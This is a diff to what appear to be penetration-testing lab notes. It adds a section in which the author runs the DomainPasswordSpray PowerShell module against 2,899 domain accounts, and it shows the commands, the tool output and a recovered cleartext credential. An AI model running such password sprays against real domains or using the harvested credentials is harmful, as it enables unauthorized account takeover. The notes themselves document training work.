@@ -148,3 +148,31 @@ aud1t_gr0up_m3mbersh1ps!
 ```
 
 Searched for [creds](./cred_file_hunt.txt) and [connection strings](./connection_string_search.txt).
+
+**Did DomainPasswordSpay**
+
+Found creds: `BR086:Welcome1`
+
+```powershell
+PS C:\Users\AB920\Desktop> Import-Module .\DomainPasswordSpray.ps1;
+PS C:\Users\AB920\Desktop> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_welcome1_ms01.txt
+[*] Current domain is compatible with Fine-Grained Password Policy.
+[*] Now creating a list of users to spray...
+[*] There appears to be no lockout policy.
+[*] Removing disabled users from list.
+[*] There are 2899 total users found.
+[*] Removing users within 1 attempt of locking out from list.
+[*] Created a userlist containing 2899 users gathered from the current user's domain
+[*] The domain password policy observation window is set to 30 minutes.
+[*] Setting a 30 minute wait in between sprays.
+
+Confirm Password Spray
+Are you sure you want to perform a password spray against 2899 accounts?
+[Y] Yes  [N] No  [?] Help (default is "Y"):
+[*] Password spraying has begun with  1  passwords
+[*] This might take a while depending on the total number of users
+[*] Now trying password Welcome1 against 2899 users. Current time is 11:29 PM
+[*] SUCCESS! User:BR086 Password:Welcome1
+[*] Password spraying is complete
+[*] Any passwords that were successfully sprayed have been output to spray_welcome1_ms01.txt
+```
